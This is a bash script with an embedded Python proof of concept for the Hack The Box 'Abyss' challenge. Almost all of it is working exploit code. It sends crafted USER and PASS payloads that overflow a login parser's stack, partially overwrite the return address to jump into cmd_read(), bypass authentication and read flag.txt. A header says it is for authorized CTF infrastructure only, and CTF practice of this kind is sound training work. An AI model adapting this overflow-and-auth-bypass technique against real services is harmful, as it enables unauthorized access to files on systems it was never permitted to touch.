#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Abyss
# Type: Parser-driven stack overflow -> partial RIP overwrite -> auth bypass
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=8
readonly DEFAULT_STAGE_DELAY=0.6

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
STAGE_DELAY="${DEFAULT_STAGE_DELAY}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<USAGE
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>          Target host/IP
  --port <port>          Target TCP port
  --timeout <seconds>    Socket timeout (default: ${DEFAULT_TIMEOUT})
  --stage-delay <sec>    Delay between protocol stages (default: ${DEFAULT_STAGE_DELAY})
  --json                 Print result as JSON
  --verbose              Enable debug output
  -h, --help             Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/protocol failure
  4  Exploit sent but flag not found
USAGE
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --stage-delay)
        STAGE_DELAY="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -* )
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi

  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${HOST}:${PORT}"
  log_debug "Using partial RIP overwrite target 0x4014eb inside cmd_read()"

  python3 - "$HOST" "$PORT" "$TIMEOUT" "$STAGE_DELAY" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
import json
import re
import socket
import struct
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
stage_delay = float(sys.argv[4])
json_output = sys.argv[5] == "1"
verbose = sys.argv[6] == "1"


def emit_debug(msg: str) -> None:
    if verbose and not json_output:
        print(f"[D] {msg}", file=sys.stderr)


def fail(code: int, msg: str) -> None:
    if json_output:
        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
    else:
        print(f"[-] {msg}", file=sys.stderr)
    raise SystemExit(code)


# cmd_read+0x42 / 0x4014eb, used via low-byte partial return overwrite.
ret_partial = b"\xeb\x14\x40"

# Layout tuned to cmd_login stack frame behavior.
user_payload = b"a" * (0x5 + 0xC) + b"\x1c" + b"k" * 0xB + ret_partial
pass_payload = b"b" * (0x200 - 5)

emit_debug(f"USER payload length: {len(user_payload)}")
emit_debug(f"PASS payload length: {len(pass_payload)}")

try:
    sock = socket.create_connection((host, port), timeout=timeout)
except Exception as exc:
    fail(3, f"Connection failed: {exc}")

try:
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)

    # Stage 1: command LOGIN (0)
    sock.sendall(struct.pack("<I", 0))
    time.sleep(stage_delay)

    # Stage 2: USER line
    sock.sendall(b"USER " + user_payload)
    time.sleep(stage_delay)

    # Stage 3: PASS line (full-size, no NULL)
    sock.sendall(b"PASS " + pass_payload)
    time.sleep(stage_delay)

    # Stage 4: filename for redirected read path
    sock.sendall(b"flag.txt")

    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)
finally:
    sock.close()

output = b"".join(chunks).decode("latin1", "ignore")
match = re.search(r"HTB\{[^}]+\}", output)

if not match:
    if verbose and not json_output:
        print("[D] Response preview:", file=sys.stderr)
        print(output[:600], file=sys.stderr)
    fail(4, "Flag pattern not found in target response")

flag = match.group(0)

if json_output:
    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
else:
    print(flag)
PY
}

main "$@"
